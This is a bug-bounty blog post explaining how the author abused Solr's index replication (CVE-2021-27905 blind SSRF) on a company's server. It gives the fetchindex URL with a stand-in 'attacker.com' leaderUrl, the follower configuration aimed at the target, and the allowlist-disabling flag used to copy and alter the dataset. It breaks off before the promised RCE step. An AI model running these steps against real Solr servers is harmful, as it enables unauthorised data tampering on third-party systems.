---
layout: post
title: A very fancy technique to obtain RCE on a Solr server 
date: 2025/02/02
tags: web bugbounties
permalink: /posts/rce-on-solr-server-via-replication
header:
  teaser: 
---

{% raw %}Hello there! In this post, I will be discussing one of the most beautiful and complex vulnerabilities I have ever found, and how it got triaged as "Duplicate" although I was the only one achieving RCE. I discovered it some weeks ago in the same bug bounty program as the one described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">my previous post</a>. As back then, since this is a private program, I will need to hide many stuff. However, I can tell you that it belongs to one of the biggest videogames companies, which doesn't have a very good relationship with hackers and other tinkerers ;). I hope you appreciate it and find it as interesting as me!


[[ Previous work ]]

This story begins last year, when I found three vulnerabilities in different Solr servers from a single private program. As already mentioned, some of these vulnerabilities are described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">another post from this blog</a>. I really recommend reading it first, since it serves as an introduction to some Solr concepts that will be discussed here.

One of these Solr servers contained frontend data for all european stores of the company, such as product names, descriptions, prices, image URLs, sales, etc. It was open and could be queried freely, so it didn't contain any private data. Among other bugs, I found that it was vulnerable to a blind SSRF, which is was a known vulnerabilitiy identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>. However, since it was not a high or critical severity bug, I didn't report it and decided to keep it to myself in case I could use it in the future as part of a more complex exploit chain. In the end, I just left this behind and moved into some other unrelated project.

Some months later (two weeks ago at the time of writing this post), I decided that I would like to spend more time doing bug bounties. I thought that it could be a good starting point to check all my previous notes for the vulnerabilities that I had reported in the past, in case something had changed. The goal was to get into the mood and to try preparing my mind to start hacking consistently, as I have found during my career that the mental aspect is the most difficult part for me when doing bug bounties.

Now, with a more possitive perspective in mind, when I remembered that I had a blind SSRF in a program in which I had already found two high and one critical bugs, I knew that I had to take another look. However, this time I was going to take a more research-like approach and was decided to dig much deeper into Solr. I quickly verified that the blind SSRF was still exploitable and got right into it.


[[ Understanding the blind SSRF ]]

My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. As already mentioned it's knwon as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and is located in the replication handler of the Solr server, which in this case was at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "de" is the name of one of the available Solr cores in the target server:

<div class="code">https://target.com/solr/de/replication?command=fetchindex&leaderUrl=attacker.com</div>

In order to learn more about all the functionalites involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not diffcult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.

<img src="/assets/images/posts/2025-02-21/replication.png" style="width: 15em">

Each of the instances that participate in this infrastructure has an available request handler ("/replication"), which accepts a series of commands depending if its a leader or a follower. These commands are detailed in <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html#http-api-commands-for-the-replicationhandler">one of the sections of the Index Replication chapter</a>, in which "fetchindex" is described as follows:

<div class="code">fetchindex

  Force the specified follower to fetch a copy of the index from its leader.

    http://_follower_host:port_/solr/_core_name_/replication?command=fetchindex

  You can pass an extra attribute such as leaderUrl or compression (or any other parameter described in Configuring a Follower Server) to do a one time replication from a leader. This removes the need for hard-coding the leader URL in the follower configuration.
</div>

This meant that the Solr server in which I found the blind SSRF was a follower instance, for which a leader could be specified to perform a one time replication from it by using the "fetchindex" command. When I learnt about this, the first thing I thought was that maybe I could be able to create a malicious Solr server that acted as a leader and distribute a copy of my own data into the target server. Since the target Solr server contained the data for all Europe stores of the company, this would mean that I would be able to modify the contents of these stores! This sounded great, but there was a long road ahead.

Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration. In this case, it could be executed at the followin URL:

<div class="code">https://target.com/solr/de/replication?command=details</div>

The server sent back a huge JSON response that I didn't understand at the moment (also, I couldn't find any copy of this response when writing this post, since they have now restricted access to this endpoint and I didn't take enough screenshots lol). However, I learnt from this output that this server also allowed others to replicate data from it, meaning that I could download the entire dataset.

This would be very useful, since, theoretically, I could just replicate the dataset, introduce a test enrty and then distribute it back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the dataset by querying for the newly added entry.

Great, the goal now was first to deplout a malicious Solr instance and check if I could replicate the database from the target server.


[[ Creating my own Solr instance ]]

So, I downloaded the latest binary release from the <a href="https://solr.apache.org/downloads.html">Solr webiste</a> and followed their <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/installing-solr.html">deployment guide</a>. This binary release includes a command line interface tool that allows starting/stoping Solr, managing cores, basic configuration, etc. This way, Solr can be started on port 9000 with the following command:

<div class="code">$ ./bin/solr start -p 9000</div>

Once the "start" command has completed, the admin interface can be accessed at "http://127.0.0.1:9000/":

<img src="/assets/images/posts/2025-02-21/solr_admin.png" style="width: 50em">

The next step was to create a core, which is just a fancy name for a dataset. The following command creates a new empty core named "hacefresk0":

<div class="code">$ ./bin/solr create -c hacefresk0</div>

It can then be queried at the select request handler:

<img src="/assets/images/posts/2025-02-21/select.png" style="width: 60em">

Then, I needed to configure the replication handler for the core to be a follower of the target server "https://target.com/solr/de/". To do so, I needed to edit the core configuration file located at "server/solr/hacefresk0/conf/solrconfig.xml" and add the following entry:

<div class="code">&#60;requestHandler name="/replication" class="solr.ReplicationHandler" &#62;
  &#60;lst name="slave"&#62;
        &#60;str name="leaderUrl"&#62;https://target.com/solr/de/&#60;/str&#62;
        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
  &#60;/lst&#62;
&#60;/requestHandler&#62;</div>

After restarting the server, I should be able to replicate the dataset using the "fetchindex" in the replication endpoint. However, the server responded with the following error:

<img src="/assets/images/posts/2025-02-21/whitelist_error.png" style="width: 60em">

Some googling around later, I found that, currently, Solr requires the specified "leaderUrl" to be explicitly whitelisted or to use the flag "-Dsolr.disable.allowUrls=true" on start up. This means that either the target server is using an old Solr version that doesn't implement this protection or that they are explicitely using this flag. Anyways, I restarted the server using this flag:

<div class="code">$ ./bin/solr stop; ./bin/solr start -p 9000 -Dsolr.disable.allowUrls=true</div>

And then, I executed the "fetchindex" command again and was able to successfuly replicate the dataset from the target server!

<img src="/assets/images/posts/2025-02-21/successful_replication.png" style="width: 60em">

As I have mentioned before, this behavior alone is not a vulnerability on istelf, since this dataset is public and doesn't contain any private information.

Next thing is to add some minor entry to later prove that I can modify the database. To do so, I first stoped the polling of more data from the target server with the replication command "disablepoll", since a new replication would overwrite local changes. Then, I added an entry with ID "1337" and title "Hacked by hacefresk0" :P

<img src="/assets/images/posts/2025-02-21/edit.png" style="width: 60em">

Great! I at this point I had a replica of the dataset from the target server with a newly added 1337-elite-hacker entry which would prove that I could edit the data. Now, I needed to check if I could actually distribute this dataset to the target server or if this was all just a rabbit hole.


[[ Replicating to the target server ]]


{% endraw %}